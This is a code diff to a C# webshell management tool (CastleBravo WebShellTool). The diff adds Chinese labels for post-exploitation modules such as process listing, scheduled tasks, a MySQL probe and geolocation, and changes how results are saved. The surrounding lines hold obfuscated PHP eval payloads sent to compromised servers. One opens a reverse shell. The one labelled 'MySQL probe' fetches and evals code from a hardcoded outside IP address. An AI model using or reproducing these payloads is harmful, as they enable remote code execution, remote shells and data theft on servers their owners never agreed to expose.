@@ -180,7 +180,15 @@ namespace C2.Business.CastleBravo.WebShellTool
         public static string MSFPayload = "{0}=@eval/*AbasBwwevC*/(base64_decode(strrev($_REQUEST[0])));&0===QfK0wOpgSZpRGIgACIK0QfgACIgoQD7kiYkgCbhZXZgACIgACIgAiCNsHIlNHblBSfgACIgoQD7kCKzNXYwlnYf5Waz9Ga1NHJgACIgACIgAiCNsTKiRCIscyJo42bpR3YuVnZfVGdhVmcjBSPgM3chBXei9lbpN3boV3ckACIgACIgACIK0wegkSKnwWY2V2XlxmYhNXak5icvRXdjVGel5ibpN3boV3cngCdld2Xp5WagYiJgkyJul2cvhWdzdCKkVGZh9Gbf52bpNnblRHelhCImlGIgACIK0wOlBXe091ckASPg01JlBXe091aj92cnNXbns1UMFkQPx0RkACIgACIK0wOzRCI9ASXns2YvN3Zz12JbNFTBJ0TMdEJgkgCN0HIgACIK0QfgACIgACIgAiCNszahVmciBCIgACIgACIgACIgACIgAiCNsTKpIGJo4WZsJHdzBSLg4WZsRCIsMHJoQWYlJ3X0V2aj92cg0jLgIGJgACIgACIgACIgACIgACIgoQD6cCdlt2YvN3JgU2chNGIgACIgACIgACIgAiCNszahVmciBCIgACIgACIgACIgACIgAiCNsTKpIGJo4WZsJHdzBSLg4WZsRCIsMHJoQWYlJnZg0jLgIGJgACIgACIgACIgACIgACIgoQD6cSbhVmc0N3JgU2chNGIgACIgACIgACIgAiCNsHIpUGc5R3XzRCKgg2Y0l2dzBCIgACIgACIK0wegkiblxGJgwDIpIGJo4WZsJHdzhCIlxWaodHIgACIK0wOncCI9AiYkACIgAiCNsTXn4WZsdyWhRCI9AiblxGJgACIgoQD7kiblxGJgwiIuVGbOJCKrNWYw5Wdg0DIhRCIgACIK0QfgACIgoQD7kCKllGZgACIgACIgAiCNsHIp4WZsRSIoAiZpBCIgAiCN0HIgACIK0wOrFWZyJGIgACIgACIgACIgAiCNsTK0ACLzRCKkFWZy9Fdlt2YvNHI9AiblxGJgACIgACIgACIgACIK0gOnQXZrN2bzdCIlNXYjBCIgACIgACIK0wOrFWZyJGIgACIgACIgACIgAiCNsTK0ACLzRCKkFWZyZGI9AiblxGJgACIgACIgACIgACIK0gOn0WYlJHdzdCIlNXYjBCIgACIgACIK0wegkSZwlHdfNHJoACajRXa3NHIgACIK0QfgACIgoQD7kyJ0V2aj92cg8mbngSZpRGIgACIgACIgoQD7BSKzRSIoAiZpBCIgAiCN0HIgACIK0wOpcycj5WdmBCdlt2YvNHIv52JoUWakBCIgACIgACIK0wegkSZwlHdfNHJhgCImlGIgACIK0QfgACIgoQD7cCdlt2YvN3Jg0DIlBXe091ckACIgACIgACIK0QfgACIgACIgAiCNsTKoUWakBCIgACIgACIgACIgoQD7BSKzVmckECKgYWagACIgACIgAiCNsTK0J3bwRCIsAXakACLzRCK0NWZu52bj9Fdlt2YvNHQg0DIzVmckACIgACIgACIK0wOpA1QU9FTPNFIs0UQFJFVT91SD90UgwCVF5USfZUQoYGJg0DIzRCIgACIgACIgoQD7BSKpYGJoUGbiFGbsF2YfNXagYiJgkyJlRXYlJ3YfRXZrN2bzdCI9AiZkgCImYCIzRSIoAiZpBCIgAiCN0HIgACIK0wOn0WYlJHdzdCI9ASZwlHdfNHJgACIgACIgAiCNsTK0J3bwRCIsAXakgiZkASPgMHJgACIgACIgAiCNsHIpkiZkgSZsJWYsxWYj91cpBiJmASKn4WZw92aj92cmdCI9AiZkgCImYCIzRSIoAiZpBCIgAiCN0HIgACIK0wOn0WYlJHdzdCI9ASZwlHdfNHJgACIgACIgAiCNsTKi0Hdy9GcksnO9BXaks3LvoDcjRnIoYGJg0DIzRCIgACIgACIgoQD7BSKpYGJoUGbiFGbsF2YfNXagYiJgkyJ05WZpx2YfRXZrN2bz9VbhVmc0N3Jg0DImRCKoAiZpBCIgAiCNsDdy9Gck4iI0J3bwJCIvh2YllgCNsDcpRCIuICcpJCIvh2YllgCNsTXxsFVT9EUfRCI9ACdy9GckACIgAiCNsTKdJzWUN1TQ9FJoUGZvNWZk9FN2U2chJGI9ACcpRCIgACIK0gCNsHIpkSXysFVT9EUfRCK0V2czlGImYCIp0VMbR1UPB1XkgCdlN3cphCImlmCNsTKxgCdy9mYh9lclNXdfVmcv52ZppQD7kCMoQXatlGbfVWbpR3X0V2c&1={1}&2={2}";
         public static string ReverseShellPayload = "{0}=@eval/*AbasBwwevC*/(base64_decode(base64_decode($_REQUEST[0])));&0=WlhKeWIzSmZjbVZ3YjNKMGFXNW5LRVZmUlZKU1QxSWdmQ0JGWDFCQlVsTkZLVHRBYzJWMFgzUnBiV1ZmYkdsdGFYUW9NQ2s3RFFva2IzTTlVRWhRWDA5VE93MEthV1lvYVhOelpYUW9KRjlRVDFOVVd6RmRLU1ltYVhOelpYUW9KRjlRVDFOVVd6SmRLU2tOQ25za2NHOXlkRDBrWDFCUFUxUmJNVjA3RFFva2FYQTlZbUZ6WlRZMFgyUmxZMjlrWlNna1gxQlBVMVJiTWwwcE93MEtKR1p3UFdaemIyTnJiM0JsYmlna2FYQWdMQ0FrY0c5eWRDQXNJQ1JsY25KdWJ5d2dKR1Z5Y25OMGNpazdEUXBwWmlBb0lTUm1jQ2w3RFFva2NtVnpkV3gwSUQwZ0lrNXZkQ0JqYjI1dVpXTjBhVzl1SWpzTkNuME5DbVZzYzJVZ2V3MEtabkIxZEhNZ0tDUm1jQ0FzSWx4dUtrOVRPaUl1Skc5ekxpSXVJRU52Ym01bFkzUWdjM1ZqWTJWemN5RXFYRzRpS1RzTkNuZG9hV3hsS0NGbVpXOW1LQ1JtY0NrcGV5QU5DbVp3ZFhSeklDZ2tabkFzSWlCemFHVnNiRG9nSWlrN0RRb2tjbVZ6ZFd4MFBTQm1aMlYwY3lBb0pHWndMQ0EwTURrMktUc05DaVJ0WlhOellXZGxQV0FrY21WemRXeDBZRHNOQ21ad2RYUnpJQ2drWm5Bc0lpMHRQaUFpTGlSdFpYTnpZV2RsTGlKY2JpSXBPeUI5RFFwbVkyeHZjMlVnS0NSbWNDazdmWDA9&1={1}&2={2}";
         public static string MysqlProbePayload = "{0}=@eval/*ABC*/(base64_decode(base64_decode($_REQUEST[0])));&0=YzJWemMybHZibDl6ZEdGeWRDZ3BPdzBLYVdZb1pXMXdkSGtvSkY5VFJWTlRTVTlPV3lkamNYVjFhR3A0WTI5dUoxMHBLUTBLZXlSZlUwVlRVMGxQVGxzblkzRjFkV2hxZUdOdmJpZGRQV1pwYkdWZloyVjBYMk52Ym5SbGJuUnpLQ0pvZEhSd09pOHZNVEF6TGpRekxqRTNMamt2ZDJzdlkyOXVaaTVuYVdZaUtUdDlEUXBBWlhaaGJDaG5lbWx1Wm14aGRHVW9KRjlUUlZOVFNVOU9XeWRqY1hWMWFHcDRZMjl1SjEwcEtUcz0=&1={1}&2={2}&3={3}";
-        
+
+        public static Dictionary<SGType, string> table = new Dictionary<SGType, string>()
+            {
+                {SGType.ProcessView, "进程信息"},
+                {SGType.ScheduleTask, "定时任务"},
+                {SGType.MysqlProbe, "Mysql探针"},
+                {SGType.SystemInfo, "系统信息"},
+                {SGType.LocationInfo, "地理定位" }
+            };
         public static Dictionary<SGType, string> PayloadDict = new Dictionary<SGType, string>
                                            {
                                              {SGType.MysqlBlasting, MysqlPayload },
@@ -201,15 +209,21 @@ namespace C2.Business.CastleBravo.WebShellTool
        
         public static string WriteResult(string result, string url, string type)
         {
-            string time = DateTime.Now.ToString("yyyyMMDDHHmmss");           
+            string time = DateTime.Now.ToString("yyyyMMdd");           
             try
             {
 
                 Match m = new Regex("://(.*?)/").Match(url);
                 string fileName = m.Success ? string.Format("{0}_{1}", m.Groups[1].Value, time) : time;
-                fileName += ".txt";
                 string path = Path.Combine(Global.UserWorkspacePath, "后信息采集", type);
                 Directory.CreateDirectory(path);
+                if (type == ClientSetting.table[SGType.SystemInfo])
+                    if (result.Contains("服务器操作系统:Linux"))
+                        fileName += "_Linux";
+                    else if (result.Contains("服务器操作系统:WINNT"))
+                        fileName += "_Windows";
+
+                fileName += ".txt";
                 string filePath = Path.Combine(path, fileName);
                 using (StreamWriter sw = new StreamWriter(filePath, false, Encoding.Default))
                 {
